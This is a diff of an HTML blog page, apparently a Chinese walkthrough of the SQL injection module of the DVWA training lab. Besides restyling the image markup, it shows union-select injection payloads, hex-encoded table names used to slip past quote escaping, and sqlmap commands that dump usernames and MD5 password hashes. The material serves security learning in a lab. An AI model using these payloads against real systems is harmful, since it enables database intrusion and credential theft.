-<p><img alt="image-20240411221106229" loading="lazy" src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735697.png"></p>
+<p>
+<div class="post-img-view">
+    <a data-fancybox="gallery" href="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735697.png">
+        <img src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735697.png" 
+             alt="image-20240411221106229" 
+              
+             loading="lazy"
+        />
+    </a>
+</div></p>
 <p>3、提取字段名</p>
 <p>通过注入攻击获取数据库中特定表（本例中为 <code>users</code> 表）的所有字段名。</p>
 <div class="highlight"><div class="chroma">
@@ -1076,7 +1382,16 @@
 <pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="mi">1</span><span class="s1">&#39; union select 1,column_name from information_schema.columns where table_name=&#39;</span><span class="n">users</span><span class="s1">&#39;#
 </span></span></span></code></pre></td></tr></table>
 </div>
-</div><p><img alt="image-20240412083706100" loading="lazy" src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735698.png"></p>
+</div><p>
+<div class="post-img-view">
+    <a data-fancybox="gallery" href="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735698.png">
+        <img src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735698.png" 
+             alt="image-20240412083706100" 
+              
+             loading="lazy"
+        />
+    </a>
+</div></p>
 <p>4、提取值</p>
 <p>从数据库表 <code>users</code> 中提取 <code>user</code> 和 <code>password</code> 字段的数据</p>
 <div class="highlight"><div class="chroma">
@@ -1088,7 +1403,16 @@
 </span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>执行命令出现同样的字符编码问题，解决方法还是修改字段的字符集</p>
-<p><img alt="image-20240412083801374" loading="lazy" src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735699.png"></p>
+<p>
+<div class="post-img-view">
+    <a data-fancybox="gallery" href="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735699.png">
+        <img src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735699.png" 
+             alt="image-20240412083801374" 
+              
+             loading="lazy"
+        />
+    </a>
+</div></p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -1100,8 +1424,26 @@
 </span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>执行成功得到用户和密码的数据，密码为32位小写MD5，可以通过 <a href="https://www.cmd5.com/default.aspx">在线工具</a> 解密</p>
-<p><img alt="image-20240412084253957" loading="lazy" src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735700.png"></p>
-<p><img alt="image-20240412111534464" loading="lazy" src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735701.png"></p>
+<p>
+<div class="post-img-view">
+    <a data-fancybox="gallery" href="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735700.png">
+        <img src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735700.png" 
+             alt="image-20240412084253957" 
+              
+             loading="lazy"
+        />
+    </a>
+</div></p>
+<p>
+<div class="post-img-view">
+    <a data-fancybox="gallery" href="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735701.png">
+        <img src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735701.png" 
+             alt="image-20240412111534464" 
+              
+             loading="lazy"
+        />
+    </a>
+</div></p>
 <p><strong>六、SQLmap工具使用</strong></p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -1111,9 +1453,36 @@
 <pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sqlmap -u &#34;http://dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&#34; --cookie &#34;PHPSESSID=265uqla8dabr5jt04llgsk4sc9; security=low&#34;
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p><img alt="image-20240412103446366" loading="lazy" src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735702.png"></p>
-<p><img alt="image-20240412103645411" loading="lazy" src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735703.png"></p>
-<p><img alt="image-20240412104023272" loading="lazy" src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735704.png"></p>
+</div><p>
+<div class="post-img-view">
+    <a data-fancybox="gallery" href="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735702.png">
+        <img src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735702.png" 
+             alt="image-20240412103446366" 
+              
+             loading="lazy"
+        />
+    </a>
+</div></p>
+<p>
+<div class="post-img-view">
+    <a data-fancybox="gallery" href="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735703.png">
+        <img src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735703.png" 
+             alt="image-20240412103645411" 
+              
+             loading="lazy"
+        />
+    </a>
+</div></p>
+<p>
+<div class="post-img-view">
+    <a data-fancybox="gallery" href="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735704.png">
+        <img src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735704.png" 
+             alt="image-20240412104023272" 
+              
+             loading="lazy"
+        />
+    </a>
+</div></p>
 <p>1、提取库名</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -1123,7 +1492,16 @@
 <pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sqlmap -u &#34;http://dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&#34; --cookie &#34;PHPSESSID=265uqla8dabr5jt04llgsk4sc9; security=low&#34; --dbs
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p><img alt="image-20240412104144581" loading="lazy" src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735705.png"></p>
+</div><p>
+<div class="post-img-view">
+    <a data-fancybox="gallery" href="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735705.png">
+        <img src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735705.png" 
+             alt="image-20240412104144581" 
+              
+             loading="lazy"
+        />
+    </a>
+</div></p>
 <p>2、提取表名</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -1133,7 +1511,16 @@
 <pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sqlmap -u &#34;http://dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&#34; --cookie &#34;PHPSESSID=265uqla8dabr5jt04llgsk4sc9; security=low&#34; -D dvwa --tables
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p><img alt="image-20240412104236250" loading="lazy" src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735706.png"></p>
+</div><p>
+<div class="post-img-view">
+    <a data-fancybox="gallery" href="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735706.png">
+        <img src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735706.png" 
+             alt="image-20240412104236250" 
+              
+             loading="lazy"
+        />
+    </a>
+</div></p>
 <p>3、提取字段名</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -1143,7 +1530,16 @@
 <pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sqlmap -u &#34;http://dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&#34; --cookie &#34;PHPSESSID=265uqla8dabr5jt04llgsk4sc9; security=low&#34; -D dvwa -T users --columns
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p><img alt="image-20240412104324776" loading="lazy" src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735707.png"></p>
+</div><p>
+<div class="post-img-view">
+    <a data-fancybox="gallery" href="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735707.png">
+        <img src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735707.png" 
+             alt="image-20240412104324776" 
+              
+             loading="lazy"
+        />
+    </a>
+</div></p>
 <p>4、提取值</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -1153,7 +1549,16 @@
 <pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sqlmap -u &#34;http://dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&#34; --cookie &#34;PHPSESSID=i0ssj777jur6gqb9af6bd111tn; security=low&#34; --batch -D dvwa -T users -C user,password --dump
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p><img alt="image-20240603085905398" loading="lazy" src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735708.png"></p>
+</div><p>
+<div class="post-img-view">
+    <a data-fancybox="gallery" href="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735708.png">
+        <img src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735708.png" 
+             alt="image-20240603085905398" 
+              
+             loading="lazy"
+        />
+    </a>
+</div></p>
 <p><strong>七、分析后台脚本</strong></p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -1273,14 +1678,77 @@
 </div>
 </div><h3 id="medium">Medium</h3>
 <p>1、修改电脑代理服务器IP设置为127.0.0.1，端口设置为8888，Bur调整代理参数与电脑代理一致</p>
-<p><img alt="image-20240412094734133" loading="lazy" src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735710.png"></p>
-<p><img alt="image-20240412095237028" loading="lazy" src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735711.png"></p>
-<p><img alt="image-20240412094536046" loading="lazy" src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735712.png"></p>
+<p>
+<div class="post-img-view">
+    <a data-fancybox="gallery" href="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735710.png">
+        <img src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735710.png" 
+             alt="image-20240412094734133" 
+              
+             loading="lazy"
+        />
+    </a>
+</div></p>
+<p>
+<div class="post-img-view">
+    <a data-fancybox="gallery" href="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735711.png">
+        <img src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735711.png" 
+             alt="image-20240412095237028" 
+              
+             loading="lazy"
+        />
+    </a>
+</div></p>
+<p>
+<div class="post-img-view">
+    <a data-fancybox="gallery" href="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735712.png">
+        <img src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735712.png" 
+             alt="image-20240412094536046" 
+              
+             loading="lazy"
+        />
+    </a>
+</div></p>
 <p>2、在DVWA中尝试提交一个ID，在BurpSuite的repeater中查看捕获到的提交信息。使用BurpSuite的repeater模块可以重复发送数据，查看返回数据。</p>
-<p><img alt="image-20240412095327893" loading="lazy" src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735713.png"></p>
-<p><img alt="image-20240412095418437" loading="lazy" src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735714.png"></p>
-<p><img alt="image-20240412095516476" loading="lazy" src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735715.png"></p>
-<p><img alt="image-20240412095727503" loading="lazy" src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735716.png"></p>
+<p>
+<div class="post-img-view">
+    <a data-fancybox="gallery" href="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735713.png">
+        <img src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735713.png" 
+             alt="image-20240412095327893" 
+              
+             loading="lazy"
+        />
+    </a>
+</div></p>
+<p>
+<div class="post-img-view">
+    <a data-fancybox="gallery" href="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735714.png">
+        <img src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735714.png" 
+             alt="image-20240412095418437" 
+              
+             loading="lazy"
+        />
+    </a>
+</div></p>
+<p>
+<div class="post-img-view">
+    <a data-fancybox="gallery" href="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735715.png">
+        <img src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735715.png" 
+             alt="image-20240412095516476" 
+              
+             loading="lazy"
+        />
+    </a>
+</div></p>
+<p>
+<div class="post-img-view">
+    <a data-fancybox="gallery" href="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735716.png">
+        <img src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735716.png" 
+             alt="image-20240412095727503" 
+              
+             loading="lazy"
+        />
+    </a>
+</div></p>
 <p>3、确认列数</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -1294,8 +1762,26 @@
 </span></span><span class="line"><span class="cl">4 order by 3#
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p><img alt="image-20240412095859327" loading="lazy" src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735717.png"></p>
-<p><img alt="image-20240412095934153" loading="lazy" src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735718.png"></p>
+</div><p>
+<div class="post-img-view">
+    <a data-fancybox="gallery" href="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735717.png">
+        <img src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735717.png" 
+             alt="image-20240412095859327" 
+              
+             loading="lazy"
+        />
+    </a>
+</div></p>
+<p>
+<div class="post-img-view">
+    <a data-fancybox="gallery" href="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735718.png">
+        <img src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735718.png" 
+             alt="image-20240412095934153" 
+              
+             loading="lazy"
+        />
+    </a>
+</div></p>
 <p>4、库、表、字段、值</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -1328,7 +1814,16 @@
 <pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">4 union select 1,database()#
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p><img alt="image-20240412101400469" loading="lazy" src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735719.png"></p>
+</div><p>
+<div class="post-img-view">
+    <a data-fancybox="gallery" href="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735719.png">
+        <img src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735719.png" 
+             alt="image-20240412101400469" 
+              
+             loading="lazy"
+        />
+    </a>
+</div></p>
 <p>提取表名</p>
 <p>注入语句发现单引号被转义，使用BurpSuite的Decoder模块，将 <code>'dvwa'</code> 转为16进制，自行添加 <code>0x</code></p>
 <div class="highlight"><div class="chroma">
@@ -1341,9 +1836,36 @@
 </span></span><span class="line"><span class="cl">4 union select 1,table_name from information_schema.tables where table_schema=0x64767761#
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p><img alt="image-20240412101948084" loading="lazy" src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735720.png"></p>
-<p><img alt="image-20240412102504354" loading="lazy" src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735721.png"></p>
-<p><img alt="image-20240412102654211" loading="lazy" src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735722.png"></p>
+</div><p>
+<div class="post-img-view">
+    <a data-fancybox="gallery" href="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735720.png">
+        <img src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735720.png" 
+             alt="image-20240412101948084" 
+              
+             loading="lazy"
+        />
+    </a>
+</div></p>
+<p>
+<div class="post-img-view">
+    <a data-fancybox="gallery" href="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735721.png">
+        <img src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735721.png" 
+             alt="image-20240412102504354" 
+              
+             loading="lazy"
+        />
+    </a>
+</div></p>
+<p>
+<div class="post-img-view">
+    <a data-fancybox="gallery" href="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735722.png">
+        <img src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735722.png" 
+             alt="image-20240412102654211" 
+              
+             loading="lazy"
+        />
+    </a>
+</div></p>
 <p>提取字段名</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -1353,7 +1875,16 @@
 <pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">4 union select 1,column_name from information_schema.columns where table_schema=0x64767761 and table_name=0x7573657273#
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p><img alt="image-20240412102804247" loading="lazy" src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735723.png"></p>
+</div><p>
+<div class="post-img-view">
+    <a data-fancybox="gallery" href="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735723.png">
+        <img src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735723.png" 
+             alt="image-20240412102804247" 
+              
+             loading="lazy"
+        />
+    </a>
+</div></p>
 <p>提取user、password的值</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -1363,10 +1894,28 @@
 <pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">4 union select user,password from users#
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p><img alt="image-20240412102914074" loading="lazy" src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735724.png"></p>
+</div><p>
+<div class="post-img-view">
+    <a data-fancybox="gallery" href="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735724.png">
+        <img src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735724.png" 
+             alt="image-20240412102914074" 
+              
+             loading="lazy"
+        />
+    </a>
+</div></p>
 <p>SQLmap工具使用</p>
 <p>将第一步抓到的数据保存在桌面，命名为1.txt文件</p>
-<p><img alt="image-20240603112004596" loading="lazy" src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735725.png"></p>
+<p>
+<div class="post-img-view">
+    <a data-fancybox="gallery" href="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735725.png">
+        <img src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735725.png" 
+             alt="image-20240603112004596" 
+              
+             loading="lazy"
+        />
+    </a>
+</div></p>
 <p>使用 <code>-r</code> 参数指定文件路径。</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -1378,7 +1927,16 @@
 </span></span><span class="line"><span class="cl">// -r REQUESTFILE      从文件中读取 HTTP 请求
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p><img alt="image-20240603101812626" loading="lazy" src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735726.png"></p>
+</div><p>
+<div class="post-img-view">
+    <a data-fancybox="gallery" href="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735726.png">
+        <img src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735726.png" 
+             alt="image-20240603101812626" 
+              
+             loading="lazy"
+        />
+    </a>
+</div></p>
 <p>操作步骤与前面一致，最后得到user、password数据</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -1388,7 +1946,16 @@
 <pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sqlmap -r C:\Users\yuexuan\Desktop\1.txt  --cookie &#34;PHPSESSID=ef4ln5lm529kdmhri3meltn9lk; security=medium&#34; --batch -D dvwa -T users -C user,password --dump
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p><img alt="image-20240603102226671" loading="lazy" src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735727.png"></p>
+</div><p>
+<div class="post-img-view">
+    <a data-fancybox="gallery" href="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735727.png">
+        <img src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735727.png" 
+             alt="image-20240603102226671" 
+              
+             loading="lazy"
+        />
+    </a>
+</div></p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
@@ -1463,10 +2030,37 @@
 </div>
 </div><h3 id="high">High</h3>
 <p>1、点击链接弹出小窗，提交1，使用BurpSuite抓包。</p>
-<p><img alt="image-20240603092627559" loading="lazy" src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735728.png"></p>
-<p><img alt="image-20240603092835322" loading="lazy" src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735729.png"></p>
+<p>
+<div class="post-img-view">
+    <a data-fancybox="gallery" href="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735728.png">
+        <img src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735728.png" 
+             alt="image-20240603092627559" 
+              
+             loading="lazy"
+        />
+    </a>
+</div></p>
+<p>
+<div class="post-img-view">
+    <a data-fancybox="gallery" href="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735729.png">
+        <img src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735729.png" 
+             alt="image-20240603092835322" 
+              
+             loading="lazy"
+        />
+    </a>
+</div></p>
 <p>尝试放包，回显信息出现在原页面</p>
-<p><img alt="image-20240603093053482" loading="lazy" src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735730.png"></p>
+<p>
+<div class="post-img-view">
+    <a data-fancybox="gallery" href="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735730.png">
+        <img src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735730.png" 
+             alt="image-20240603093053482" 
+              
+             loading="lazy"
+        />
+    </a>
+</div></p>
 <p>2、注入方式与Low、Medium级别一致，最后得到user、password数据</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -1476,7 +2070,16 @@
 <pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">1&#39; union select user,password from users#
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p><img alt="image-20240603093607403" loading="lazy" src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735731.png"></p>
+</div><p>
+<div class="post-img-view">
+    <a data-fancybox="gallery" href="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735731.png">
+        <img src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735731.png" 
+             alt="image-20240603093607403" 
+              
+             loading="lazy"
+        />
+    </a>
+</div></p>
 <p>SQLmap工具使用</p>
 <p>因为提交数据与回显数据的页面不同，所以需要添加第二个回显地址。将第一步抓到的数据保存在桌面，命名为1.txt文件，使用 <code>-r</code> 参数指定文件路径。 <code>--second-url</code> 参数指定会先页面URL。</p>
 <div class="highlight"><div class="chroma">
@@ -1487,7 +2090,16 @@
 <pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sqlmap -r C:\Users\yuexuan\Desktop\1.txt --second-url &#34;http://dvwa/vulnerabilities/sqli/&#34; --cookie &#34;PHPSESSID=ef4ln5lm529kdmhri3meltn9lk; security=high&#34; --batch --dbs
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p><img alt="image-20240603100335290" loading="lazy" src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735732.png"></p>
+</div><p>
+<div class="post-img-view">
+    <a data-fancybox="gallery" href="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735732.png">
+        <img src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735732.png" 
+             alt="image-20240603100335290" 
+              
+             loading="lazy"
+        />
+    </a>
+</div></p>
 <p>操作步骤与前面一致，最后得到user、password数据</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -1497,7 +2109,16 @@
 <pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sqlmap -r C:\Users\yuexuan\Desktop\1.txt --second-url &#34;http://dvwa/vulnerabilities/sqli/&#34; --cookie &#34;PHPSESSID=ef4ln5lm529kdmhri3meltn9lk; security=high&#34; --batch -D dvwa -T users -C user,password --dump
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p><img alt="image-20240603101120077" loading="lazy" src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735733.png"></p>
+</div><p>
+<div class="post-img-view">
+    <a data-fancybox="gallery" href="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735733.png">
+        <img src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735733.png" 
+             alt="image-20240603101120077" 
+              
+             loading="lazy"
+        />
+    </a>
+</div></p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
